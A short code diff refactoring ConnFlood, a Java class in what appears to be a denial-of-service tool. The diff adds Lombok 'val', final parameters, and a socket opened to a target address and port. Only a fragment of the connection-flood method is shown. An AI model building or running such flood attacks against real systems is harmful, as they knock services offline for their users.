@@ -5,6 +5,7 @@ import ir.xenoncommunity.jss.utils.AttackStatics;
 import ir.xenoncommunity.jss.utils.SocketUtils;
 import lombok.Cleanup;
 import lombok.RequiredArgsConstructor;
+import lombok.val;
 
 import java.net.InetAddress;
 import java.net.Socket;
@@ -22,9 +23,9 @@ public class ConnFlood implements IAttackMethod {
      * @throws Exception if an error occurs during the sending process
      */
     @Override
-    public void send(InetAddress addr, int port) throws Exception {
+    public void send(final InetAddress addr, final int port) throws Exception {
         // create a socket connection to the specified address and port
-        @Cleanup Socket socket = new Socket(addr, port);
+        @Cleanup val socket = new Socket(addr, port);
 
         // if the socket is not connected, return
         if (!socket.isConnected()) return;
